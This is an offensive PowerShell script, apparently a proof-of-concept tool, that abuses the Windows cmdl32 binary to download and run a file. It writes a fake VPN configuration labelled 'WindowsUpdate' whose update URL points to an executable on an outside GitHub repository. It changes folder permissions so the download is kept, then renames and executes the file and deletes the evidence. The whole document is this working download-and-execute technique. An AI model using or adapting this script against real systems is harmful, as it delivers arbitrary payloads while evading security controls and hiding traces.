Write-Host "[-] cmdl32 Downloader - liquidsky ^_~"
# Thanks to Elliot Killick (@elliotkillick) for the discovery of the lolbin

# Change to the script's directory
Set-Location -Path $PSScriptRoot

Write-Host "[*] Denying delete permissions for current user"
# Use the environment variable for the current username
icacls $PSScriptRoot /deny "$($env:USERNAME):(OI)(CI)(DE,DC)"

Write-Host "[*] Setting temp environment variable"
# Set the TMP environment variable to the current directory
$env:TMP = (Get-Location).Path

Write-Host "[*] Creating VPN settings file"
$settingsContent = @"
[Connection Manager]
CMSFile=settings.txt
ServiceName=WindowsUpdate
TunnelFile=settings.txt
[Settings]
UpdateUrl=https://raw.githubusercontent.com/fuzzlove/h4v0k/main/whois.exe
"@
Set-Content -Path "settings.txt" -Value $settingsContent

Write-Host "[*] Performing download with cmdl32"
# Assuming cmdl32 is in system32 or accessible
$cmdl32Path = "cmdl32"
$arguments = "/vpn /lan `"$PSScriptRoot\settings.txt`""

try {
    Start-Process -FilePath $cmdl32Path -ArgumentList $arguments -NoNewWindow -Wait
    Write-Host "[*] Download complete with cmdl32."
} catch {
    Write-Host "[!] cmdl32 failed: $($_.Exception.Message)"
    # Revert permissions before exiting
    icacls $PSScriptRoot /remove:d "$env:USERNAME"
    Exit
}

Write-Host "[*] Reverting permissions"
icacls $PSScriptRoot /remove:d "$env:USERNAME"

Write-Host "[*] Renaming downloaded file for execution"
# Rename the downloaded VPN file (if it follows the VPN*.tmp pattern)
$downloadedFile = Get-ChildItem -Filter "VPN*.tmp" | Select-Object -First 1

if ($downloadedFile) {
    Rename-Item -Path $downloadedFile.FullName -NewName "whois.exe" -Force
    Write-Host "[*] Renamed VPN*.tmp to whois.exe."
} else {
    Write-Host "[!] No downloaded file found matching 'VPN*.tmp'. Exiting script."
    # Revert permissions before exiting
    icacls $PSScriptRoot /remove:d "$env:USERNAME"
    Exit
}

Write-Host "[*] Executing the downloaded file"
if (Test-Path ".\whois.exe") {
    Start-Process -FilePath ".\whois.exe" -NoNewWindow -Wait
    Write-Host "[*] Execution complete."
} else {
    Write-Host "[!] whois.exe not found after renaming. Exiting script."
    Exit
}

Write-Host "[*] Cleaning up downloaded file"
Remove-Item -Path ".\whois.exe" -Force
Remove-Item -Path ".\settings.txt" -Force
Write-Host "[*] Script complete."
